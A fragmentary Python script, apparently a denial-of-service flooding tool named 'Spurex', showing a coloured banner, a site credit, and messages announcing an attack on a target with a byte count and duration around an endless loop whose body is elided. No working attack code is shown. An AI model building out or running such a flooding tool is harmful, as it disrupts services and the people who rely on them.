...
\t \033[1m\033[33m\033[1m[-] \033[0m\033[1mName     : \033[33m\033[1mSpurex
\t \033[1m\033[33m\033[1m[-] \033[0m\033[1mSite     : \033[33mhttps://holig4nizm.com
  """)


logo()

print("\n\n\n\t\t\033[32m\033[1mSpurex")
...
print("Spurex Attack Started on \033[32m%s \033[33mwith \033[32m%s\033[33m bytes for \033[32m%s\033[33m seconds." % (attack, package, duration))
while True:
...
print("Spurex Attack has completed on \033[32m%s\033[33m for \033[32m%s\033[33m Bekleyin." % (attack, duration))
